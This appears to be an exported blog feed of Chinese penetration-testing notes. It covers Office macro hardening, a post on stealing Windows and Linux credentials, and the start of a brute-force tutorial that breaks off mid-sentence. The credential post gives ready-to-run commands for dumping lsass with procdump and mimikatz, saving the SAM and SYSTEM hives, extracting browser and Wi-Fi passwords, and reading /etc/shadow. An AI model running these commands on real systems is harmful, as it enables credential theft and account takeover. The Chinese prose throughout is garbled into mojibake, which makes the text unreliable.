æ­¤ï¼Œé™ä½é£é™©çš„æœ€æœ‰æ•ˆç­–ç•¥ä¹‹ä¸€å°±æ˜¯åœ¨æ•´ä¸ªç»„ç»‡ä¸­é™åˆ¶ä½¿ç”¨å®ã€‚</p><p>å¦‚æœä¸€ä¸ªç»„ç»‡ä¸ä½¿ç”¨å®ï¼Œå®ƒä»¬ä¹Ÿå¯èƒ½è¢«å®Œå…¨ç¦ç”¨ã€‚ä½†äº‹å®å¹¶éæ€»æ˜¯å¦‚æ­¤ã€‚å½“å®å¿…é¡»ä½¿ç”¨æ—¶ï¼Œåº”è¯¥è®¾ç½®ç­–ç•¥ä»¥å°½é‡å‡å°‘å—åˆ°æ”»å‡»çš„å¯èƒ½æ€§(åœ¨ Windows ä¸Šï¼Œè¿™å¯ä»¥é€šè¿‡ç»„ç­–ç•¥ç¼–è¾‘å™¨å®Œæˆ)ã€‚è¿™å¯ä»¥é€šè¿‡ä¸¤ç§äº’è¡¥çš„å½¢å¼æ¥å®ç°:</p><ul><li><strong>App Policy åº”ç”¨ç¨‹åºæ”¿ç­–</strong> ã€‚å®åº”è¯¥åªåœ¨å®ƒä»¬å®é™…ä½¿ç”¨çš„åº”ç”¨ç¨‹åºä¸­å¯ç”¨â€”â€”ä¸ç®¡æ˜¯ Excelã€ Wordã€ PowerPoint ç­‰ã€‚æ­¤å¤–ï¼Œç»„ç»‡å¯ä»¥é€‰æ‹©åªä»å—ä¿¡ä»»ä½ç½®å¯ç”¨å®ã€ç»è¿‡æ•°å­—ç­¾åçš„å®ç­‰</li><li><strong>User Policy ç”¨æˆ·æ”¿ç­–</strong> ã€‚åœ¨ä¼ä¸šç¯å¢ƒä¸­ï¼Œåº”è¯¥åªä¸ºå®é™…ä½¿ç”¨è¯¥åŠŸèƒ½çš„ç”¨æˆ·å¯ç”¨å®</li></ul><h2 id="å‡å°‘æ”»å‡»é¢"><a href="#å‡å°‘æ”»å‡»é¢" class="headerlink" title="å‡å°‘æ”»å‡»é¢"></a>å‡å°‘æ”»å‡»é¢</h2><p>æ”»å‡»é¢æ˜¯æ•Œæ–¹å¯èƒ½å±å®³è®¾å¤‡æˆ–ç½‘ç»œçš„æ–¹å¼æˆ–åœ°ç‚¹çš„æ€»æ•°ã€‚åœ¨å®æ¶æ„è½¯ä»¶çš„èƒŒæ™¯ä¸‹ï¼Œå¯ä»¥ä¿®æ”¹ VBA å®è®¿é—®çš„åŠŸèƒ½ã€èµ„æºå’Œ COM å¯¹è±¡ï¼Œä»¥å‡å°‘æ”»å‡»é¢ã€‚</p><p>é€šè¿‡é™åˆ¶å¯¹æ¶æ„è½¯ä»¶è¿è¡Œæ‰€å¿…éœ€çš„èµ„æºçš„è®¿é—®ï¼Œç§¯æåœ°å‡å°‘ç«¯ç‚¹çš„æ”»å‡»é¢ã€‚åœ¨è¿™äº›è§„åˆ™å’Œé™åˆ¶ä¸­ï¼Œä¸‹é¢æ˜¯ä¸€äº›ä¸“é—¨é’ˆå¯¹ Office å®æ”»å‡»çš„è§„åˆ™å’Œé™åˆ¶:</p><ul><li>é˜»æ­¢ Office åº”ç”¨ç¨‹åºåˆ›å»ºå¯æ‰§è¡Œä»£ç </li><li>é˜»æ­¢æ¥è‡ª Office å®çš„ Win32è°ƒç”¨</li><li>é˜»æ­¢Office åº”ç”¨ç¨‹åºåˆ›å»ºå­è¿›ç¨‹</li><li>é˜»æ­¢ Office åº”ç”¨ç¨‹åºå‘å…¶ä»–è¿›ç¨‹æ³¨å…¥ä»£ç </li></ul><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul><li><p><a href="https://www.cynet.com/attack-techniques-hands-on/office-macro-attacks/">https://www.cynet.com/attack-techniques-hands-on/office-macro-attacks/</a></p></li><li><p><a href="https://blog.csdn.net/weixin_44288604/article/details/111059633">https://blog.csdn.net/weixin_44288604/article/details/111059633</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€åˆæ¢ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‡­è¯çªƒå–çš„å‡ ç§æ–¹å¼</title>
      <link href="posts/51894.html"/>
      <url>posts/51894.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-Windowsç™»å½•å‡­è¯çªƒå–"><a href="#0x01-Windowsç™»å½•å‡­è¯çªƒå–" class="headerlink" title="0x01 Windowsç™»å½•å‡­è¯çªƒå–"></a>0x01 Windowsç™»å½•å‡­è¯çªƒå–</h1><blockquote><p>Windowsçš„ç³»ç»Ÿå¯†ç hashé»˜è®¤æƒ…å†µä¸‹ä¸€èˆ¬ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šç¬¬ä¸€éƒ¨åˆ†æ˜¯LM-hashï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯NTLM-hashã€‚å®ƒä»¬éƒ½æ˜¯ç”¨æˆ·å¯†ç ç»è¿‡hashåŠ å¯†åçš„å½¢å¼ã€‚</p><p>Windowsç³»ç»Ÿä¸‹hashå¯†ç æ ¼å¼ä¸ºï¼šç”¨æˆ·åç§°:RID:LM-HASHå€¼:NT-HASHå€¼ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">Administrator:500:AF01DF70036EBACFAAD3B435B51404EE:44F077E27F6FEF69E7BD834C7242B040</span><br><span class="line"></span><br><span class="line">ç”¨æˆ·åç§°ä¸ºï¼šAdministrator</span><br><span class="line">RIDä¸ºï¼š500</span><br><span class="line">LM-HASHå€¼ä¸ºï¼šAF01DF70036EBACFAAD3B435B51404EE</span><br><span class="line">NTLM-HASHå€¼ä¸ºï¼š44F077E27F6FEF69E7BD834C7242B040</span><br></pre></td></tr></table></figure><h2 id="1-ä»LSASSå†…å­˜ä¸­è¯»å–"><a href="#1-ä»LSASSå†…å­˜ä¸­è¯»å–" class="headerlink" title="1.ä»LSASSå†…å­˜ä¸­è¯»å–"></a>1.ä»LSASSå†…å­˜ä¸­è¯»å–</h2><p>lsass.exeæ˜¯ä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹ï¼Œç”¨äºå¾®è½¯Windowsç³»ç»Ÿçš„å®‰å…¨æœºåˆ¶ã€‚å®ƒç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»é™†ç­–ç•¥ã€‚</p><p>è¦æƒ³è¯»å–å†…å­˜çš„å¯†ç ï¼Œå‰ææ˜¯ç”¨æˆ·ç™»é™†è¿‡æœºå™¨ï¼Œç™»é™†è¿‡å°±ä¼šåœ¨å†…å­˜ä¸­åœç•™ï¼šlsass.exeï¼Œä¸€èˆ¬åœ¨è¿›ç¨‹ç®¡ç†å™¨ä¸­èƒ½çœ‹åˆ°ï¼Œå¦‚ä¸‹å›¾ï¼ˆæµ‹è¯•æœºå™¨ï¼šwindows server 2008ï¼‰ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718221756433.png" alt="image-20210718221756433"></p><p>ç¬¬ä¸€æ­¥ï¼Œå¯¼å‡ºlsass.exeè¿›ç¨‹ä¸­çš„å†…å®¹ï¼Œä½¿ç”¨å·¥å…·ï¼šprocdumpï¼ˆæ³¨ï¼šå¿…é¡»ä½¿ç”¨ç®¡ç†å‘˜æƒé™ï¼‰ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹äº§ç”Ÿä¸€ä¸ª lsass.dmp æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718215950623.png" alt="image-20210718215950623"></p><p>ç¬¬äºŒæ­¥ï¼Œé€šè¿‡mimikatzè¯»å–ï¼ˆ08æˆ–è€…08ä»¥ä¸‹çš„æœºå™¨è¯»å–çš„ç›´æ¥æ˜¯æ˜æ–‡å¯†ç ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718222025579.png" alt="image-20210718222025579"></p><p>PSï¼šç›´æ¥ä½¿ç”¨mimikatzè¯»å–ä¹Ÿå¯ä»¥ï¼ˆå½“mimikatzæ— æ³•åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œæ—¶åˆ™ç”¨ä¸Šé¢çš„æ–¹æ³•ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#æå‡æƒé™</span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">#æŠ“å–å¯†ç </span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><h2 id="2-ä»æ³¨å†Œè¡¨ä¸­è¯»å–å¯†ç "><a href="#2-ä»æ³¨å†Œè¡¨ä¸­è¯»å–å¯†ç " class="headerlink" title="2.ä»æ³¨å†Œè¡¨ä¸­è¯»å–å¯†ç "></a>2.ä»æ³¨å†Œè¡¨ä¸­è¯»å–å¯†ç </h2><p>æ³¨å†Œè¡¨è¯»å–å¯†ç ä¸»è¦è·å–çš„æ˜¯ä¸¤ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM Sys.hiv</span><br><span class="line">reg save HKLM\SAM Sam.hiv</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718223708527.png" alt="image-20210718223708527"></p><p>å¯¼å‡ºæ³¨å†Œè¡¨ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡mimikatzè¯»å–ç®¡ç†å‘˜å¯†ç çš„hashå€¼ï¼ˆå¦‚ä¸‹å›¾ä¸­çš„Hash NTLMï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:Sam.hiv &#x2F;system:Sys.hiv &quot; exit&gt; hiv.txt</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718223905271.png" alt="image-20210718223905271"></p><h2 id="3-æŠ“å–æµè§ˆå™¨ä¿å­˜å¯†ç "><a href="#3-æŠ“å–æµè§ˆå™¨ä¿å­˜å¯†ç " class="headerlink" title="3.æŠ“å–æµè§ˆå™¨ä¿å­˜å¯†ç "></a>3.æŠ“å–æµè§ˆå™¨ä¿å­˜å¯†ç </h2><p>å¾ˆå¤šæµè§ˆå™¨éƒ½æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼Œç”¨æˆ·åœ¨ç™»å½•ä¸€äº›ç½‘ç«™çš„æ—¶å€™ä¼šé€‰æ‹©è®°ä½å¯†ç ã€‚</p><p>ä½¿ç”¨å·¥å…·LaZagneï¼Œå¯ä»¥æå–æµè§ˆå™¨æ‰€ä¿å­˜çš„å¯†ç </p><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è·å–æ‰€æœ‰å¯†ç ï¼š</span><br><span class="line">lazagne.exe all</span><br></pre></td></tr></table></figure><h2 id="4-æŸ¥çœ‹ç”µè„‘wifiå¯†ç "><a href="#4-æŸ¥çœ‹ç”µè„‘wifiå¯†ç " class="headerlink" title="4.æŸ¥çœ‹ç”µè„‘wifiå¯†ç "></a>4.æŸ¥çœ‹ç”µè„‘wifiå¯†ç </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹ç”µè„‘è¿æ¥è¿‡çš„æ‰€æœ‰wifi</span><br><span class="line">netsh wlan show profiles</span><br><span class="line"># æŸ¥çœ‹æŸä¸€wifiçš„å¯†ç </span><br><span class="line">netsh wlan show profiles name&#x3D;&quot;xxx&quot; key&#x3D;clear</span><br><span class="line"># CMDä¸€é”®è·å– æ‰€æœ‰è¿æ¥è¿‡çš„WIFIå¯†ç </span><br><span class="line">for &#x2F;f &quot;skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:&quot; %i in (&#39;netsh wlan show profiles&#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key&#x3D;clear</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718230750294.png" alt="image-20210718230750294"></p><h1 id="0x02-Linuxç™»å½•å‡­è¯çªƒå–"><a href="#0x02-Linuxç™»å½•å‡­è¯çªƒå–" class="headerlink" title="0x02 Linuxç™»å½•å‡­è¯çªƒå–"></a>0x02 Linuxç™»å½•å‡­è¯çªƒå–</h1><h2 id="1-historyè®°å½•æ•æ„Ÿæ“ä½œ"><a href="#1-historyè®°å½•æ•æ„Ÿæ“ä½œ" class="headerlink" title="1.historyè®°å½•æ•æ„Ÿæ“ä½œ"></a>1.historyè®°å½•æ•æ„Ÿæ“ä½œ</h2><p>Linuxç³»ç»Ÿä¼šè‡ªåŠ¨æŠŠç”¨æˆ·çš„æ“ä½œå‘½ä»¤è®°å½•åˆ°å†å²åˆ—è¡¨ä¸­ï¼Œå½“ç”¨æˆ·åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥è´¦å·ã€å¯†ç è¿›è¡Œç™»å½•æ—¶ï¼Œå°†ä¼šå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718233918936.png" alt="image-20210718233918936"></p><h2 id="2-shadowæ–‡ä»¶ç ´è§£"><a href="#2-shadowæ–‡ä»¶ç ´è§£" class="headerlink" title="2.shadowæ–‡ä»¶ç ´è§£"></a>2.shadowæ–‡ä»¶ç ´è§£</h2><p><code>/etc/shadow</code>ä¸­ä¿å­˜ç€ç”¨æˆ·çš„ç›¸å…³å¯†ç ä¿¡æ¯ï¼Œå¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># tail -n 1 &#x2F;etc&#x2F;shadow</span><br><span class="line">test:$6$7uNh9hzdvpT3BRuB$ndF3AH.faJPvlgA.d57JOmFTLeQEuzgVFc.sYfI5VZDkOC6D78x9at.d8eTqRuTJsqjd6uboKmmYp75wbqE1e&#x2F;:18825:0:99999:7:::</span><br></pre></td></tr></table></figure><p>testç”¨æˆ·çš„å¯†ç å¯†æ–‡å³ä¸º<code>$6$7uNh9hzdvpT3BRuB$ndF3AH.faJPvlgA.d57JOmFTLeQEuzgVFc.sYfI5VZDkOC6D78x9at.d8eTqRuTJsqjd6uboKmmYp75wbqE1e/</code></p><p>å¯ä»¥é€šè¿‡Johnæˆ–hashcatç­‰å·¥å…·è¿›è¡Œæš´åŠ›ç ´è§£è·å¾—æ˜æ–‡ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210717160033067.png" alt="image-20210717160033067"></p><h2 id="3-å…¨å±€æœç´¢æ•æ„Ÿä¿¡æ¯"><a href="#3-å…¨å±€æœç´¢æ•æ„Ÿä¿¡æ¯" class="headerlink" title="3.å…¨å±€æœç´¢æ•æ„Ÿä¿¡æ¯"></a>3.å…¨å±€æœç´¢æ•æ„Ÿä¿¡æ¯</h2><p>å…¨å±€æœç´¢é…ç½®æ–‡ä»¶ã€è„šæœ¬ã€æ•°æ®åº“ã€æ—¥å¿—æ–‡ä»¶æ˜¯å¦æœ‰åŒ…å«å¯†ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;password&#x3D;&quot; &#x2F;</span><br></pre></td></tr></table></figure><h2 id="4-mimipenguinæŠ“å–å¯†ç "><a href="#4-mimipenguinæŠ“å–å¯†ç " class="headerlink" title="4.mimipenguinæŠ“å–å¯†ç "></a>4.mimipenguinæŠ“å–å¯†ç </h2><p>ä¸€æ¬¾Linuxä¸‹çš„å¯†ç æŠ“å–ç¥å™¨ï¼Œéœ€è¦rootæƒé™è¿è¡Œï¼Œé€šè¿‡è½¬å‚¨è¿›ç¨‹å¹¶æå–å¾ˆå¯èƒ½åŒ…å«æ˜æ–‡å¯†ç çš„è¡Œæ¥åˆ©ç”¨å†…å­˜ä¸­çš„æ˜æ–‡å‡­è¯ï¼Œç›®å‰æ”¯æŒKaliã€Ubnutuç­‰æ“ä½œç³»ç»Ÿã€‚</p><p>githubåœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;huntergregal&#x2F;mimipenguin</span><br></pre></td></tr></table></figure><h2 id="5-Impost3r"><a href="#5-Impost3r" class="headerlink" title="5.Impost3r"></a>5.Impost3r</h2><p>ä¸€ä¸ªåˆ©ç”¨Cè¯­è¨€ç¼–å†™,ç”¨æ¥çªƒå–linuxä¸‹å„ç±»å¯†ç (ssh,su,sudo)çš„å·¥å…·ã€‚</p><p>githubé¡¹ç›®åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ph4ntonn&#x2F;Impost3r</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://cloud.tencent.com/developer/article/1752147">å†…ç½‘æ¸—é€ä¹‹å„ç§å¯†ç å‡­è¯çªƒå– - æ¸—é€çº¢é˜Ÿç¬”è®°</a></p><p>[2] <a href="https://mp.weixin.qq.com/s/vp-ggvm4MUqKkBwr32FEXA">Linuxä¸‹ç™»å½•å‡­è¯çªƒå–æŠ€å·§</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€åˆæ¢ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆæš´åŠ›ç ´è§£</title>
      <link href="posts/25316.html"/>
      <url>posts/25316.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-åŸç†"><a href="#0x01-åŸç†" class="headerlink" title="0x01 åŸç†"></a>0x01 åŸç†</h1><p>â€‹    æš´åŠ›ç ´è§£(brute force)ï¼Œåˆåæš´åŠ›æ”»å‡»ã€æš´åŠ›çŒœè§£ï¼Œä»æ•°å­¦å’Œé€»è¾‘å­¦çš„è§’åº¦ï¼Œå®ƒå±äºç©·ä¸¾æ³•åœ¨ç°å®åœºæ™¯çš„è¿ç”¨ã€‚å½“å¯†ç æœªçŸ¥æˆ–è·å¾—å¯†ç å“ˆå¸Œæ—¶ï¼Œæ”»å‡»è€…ä¼šä½¿ç”¨æš´åŠ›ç ´è§£æ¥è¯•å›¾ç™»å½•å¸æˆ·ï¼Œå³é€šè¿‡åˆ©ç”¨å¤§é‡çŒœæµ‹å’Œç©·ä¸¾çš„æ–¹å¼æ¥å°è¯•è·å–ç”¨æˆ·å£ä»¤çš„æ”»å‡»æ–¹å¼ã€‚åœ¨ATT&amp;CKä¸­æš´åŠ›ç ´è§£æœ‰å¦‚ä¸‹å››ç§å­æŠ€æœ¯ã€‚</p><ol><li><p>Password Guessingï¼ˆå¯†ç çŒœæµ‹ï¼‰</p><p>äº‹å…ˆä¸äº†è§£ç³»ç»Ÿå’Œç¯å¢ƒï¼Œæ”»å‡»è€…ä¼šçŒœæµ‹å¯†ç ä»¥å°è¯•ç™»å½•å¸æˆ·ã€‚åœ¨ä¸äº†è§£å¸æˆ·å¯†ç çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨æ“ä½œè¿‡ç¨‹ä¸­é€šè¿‡ä½¿ç”¨å¸¸ç”¨å¯†ç å­—å…¸æ¥çŒœæµ‹ç™»å½•å¯†ç ï¼Œè€Œæ— é¡»äº‹å…ˆäº†è§£ç³»ç»Ÿæˆ–ç¯å¢ƒå¯†ç ã€‚</p></li><li><p>Password Crackingï¼ˆå¯†ç ç ´è§£ï¼‰</p><p>å½“è·å¾—å‡­è¯ææ–™ï¼ˆä¾‹å¦‚å¯†ç å“ˆå¸Œï¼‰æ—¶ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šè§£å¯†å¯†ç æ¥å°è¯•æ¢å¤å¯ç”¨çš„å‡­æ®ï¼Œä¾‹å¦‚çº¯æ–‡æœ¬å¯†ç ã€‚</p></li><li><p>Password Sprayingï¼ˆå¯†ç å–·æ´’ï¼‰</p><p>ä½¿ç”¨å¤šä¸ªå¯†ç æ¥æš´åŠ›ç ´è§£ä¸€ä¸ªè´¦å·å¯èƒ½ä¼šå¯¼è‡´è¯¥è´¦å·è¢«é”å®šï¼Œæ”»å‡»è€…å¯èƒ½ä¼šé’ˆå¯¹è®¸å¤šä¸åŒå¸æˆ·ä½¿ç”¨å•ä¸ªæˆ–å°‘é‡çš„å¸¸ç”¨å¯†ç åˆ—è¡¨ï¼Œä»¥å°è¯•è·å–æœ‰æ•ˆå¸æˆ·å‡­æ®ã€‚</p><p>å¯†ç å–·æ´’å¸¸å¸¸é’ˆå¯¹å¦‚ä¸‹æœåŠ¡ï¼š</p><ul><li><p>SSH (22/TCP)</p></li><li><p>Telnet (23/TCP)</p></li><li><p>FTP (21/TCP)</p></li><li><p>NetBIOS/SMB /Samba (139/TCP &amp; 445/TCP)</p></li><li><p>LDAP (389/TCP)</p></li><li><p>Kerberos (88/TCP)</p></li><li><p>RDP/ç»ˆç«¯æœåŠ¡ (3389/TCP)</p></li><li><p>HTTP/HTTPç®¡ç†æœåŠ¡ (80/TCP &amp; 443/TCP)</p></li><li><p>MSSQL (1433/TCP)</p></li><li><p>Oracle (1521/TCP)</p></li><li><p>MySQL (3306/TCP)</p></li><li><p>VNC (5900/TCP)</p></li></ul></li><li><p>Credential Stuffingï¼ˆæ’åº“ï¼‰</p><p>æ”»å‡»è€…å¯ä»¥ä½¿ç”¨å—å®³è€…å†å²ä¸Šæ³„éœ²çš„æ•°æ®è·å¾—å‡­æ®ï¼Œé€šè¿‡å‡­æ®é‡å æ¥è®¿é—®ç›®æ ‡å¸æˆ·ã€‚</p></li></ol><h1 id="0x02-å®éªŒ"><a href="#0x02-å®éªŒ" class="headerlink" title="0x02 å®éªŒ"></a>0x02 å®éªŒ</h1><h2 id="1-å¯†ç çŒœæµ‹"><a href="#1-å¯†ç çŒœæµ‹" class="headerlink" title="1.å¯†ç çŒœæµ‹"></a>1.å¯†ç çŒœæµ‹</h2><p><code>Login.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>éšä¾¿ç™»å½•<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;checkLogin.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>/&gt;</span></span><br><span class="line">        Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>checkLogin.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>==<span class="string">&quot;root&quot;</span> &amp;&amp; <span class="variable">$password</span>==<span class="string">&#x27;root&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Success!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Fail!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç ä¸ºä¸€ä¸ªç®€å•çš„è¡¨å•æäº¤åˆ°åå°ï¼Œåˆ¤æ–­è´¦å·ï¼Œå¯†ç éƒ½ä¸ºrootåˆ™ç™»é™†æˆåŠŸã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715143940035.png" alt="image-20210715143940035"></p><p>æ¥ä¸‹æ¥burpsuiteæŠ“åŒ…ä½¿ç”¨Intruderæ¨¡å—è¿›è¡Œçˆ†ç ´ï¼Œé€šè¿‡å¯¹æ¯”æ•°æ®åŒ…çš„é•¿åº¦å¯ä»¥å¾ˆå¥½çš„åˆ¤æ–­æ˜¯å¦çˆ†ç ´æˆåŠŸï¼Œå› ä¸ºçˆ†ç ´æˆåŠŸå’Œå¤±è´¥çš„é•¿åº¦æ˜¯ä¸ä¸€æ ·çš„ã€‚</p><p>åœ¨æ•°æ®åŒ…ä¸­é€‰å®šæ¬²çˆ†ç ´çš„å‚æ•°</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715144802467.png" alt="image-20210715144802467"></p><p>è®¾ç½®çˆ†ç ´çš„å­—å…¸</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715144857628.png" alt="image-20210715144857628"></p><p>æ ¹æ®å“åº”çš„æ•°æ®åŒ…çš„é•¿åº¦å¯ä»¥åˆ¤æ–­å‡ºæ­£ç¡®çš„è´¦å·ã€å¯†ç ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715145116699.png" alt="image-20210715145116699"></p><p>PSï¼šè¿›é˜¶æŠ€å·§</p><p>ï¼ˆ1ï¼‰<strong>é»˜è®¤å‡­è¯</strong></p><p>åœ¨å¯¹æŸä¸€æœåŠ¡è¿›è¡Œæš´åŠ›ç ´è§£ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆåº”è¯¥å°è¯•è¯¥æœåŠ¡çš„é»˜è®¤å£ä»¤ï¼Œè¿™æ 